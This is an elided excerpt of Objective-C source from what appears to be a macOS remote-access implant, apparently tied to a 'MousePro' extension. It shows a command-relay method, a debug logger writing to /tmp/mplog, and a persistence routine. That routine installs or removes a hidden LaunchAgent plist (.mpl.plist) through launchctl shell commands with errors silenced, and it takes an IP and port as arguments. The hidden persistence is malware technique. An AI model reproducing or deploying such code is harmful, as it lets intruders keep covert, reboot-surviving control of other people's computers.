...
-(void)rocketMC:(NSString *)command {
    ...
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
        [self sendString:@"You dont have MousePro Extension"];
    }
    [self term];
}
...
-(void)debugLog:(NSString *)string {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/mplog"];
...
-(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
    NSString *mplPath = @"/Library/LaunchAgents/.mpl.plist";
    if ([args isEqualToString:@"install"]) {
        ...
        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.mpl.plist 2>/dev/null;;launchctl load /Library/LaunchAgents/.mpl.plist 2>/dev/null;":false];
    } else if ([args isEqualToString:@"uninstall"]) {
        if ([self.fileManager fileExistsAtPath:mplPath]) {
            [self runTask:@"launchctl unload /Library/LaunchAgents/.mpl.plist 2>/dev/null; rm /Library/LaunchAgents/.mpl.plist 2>/dev/null;":false];
        }
    } else {
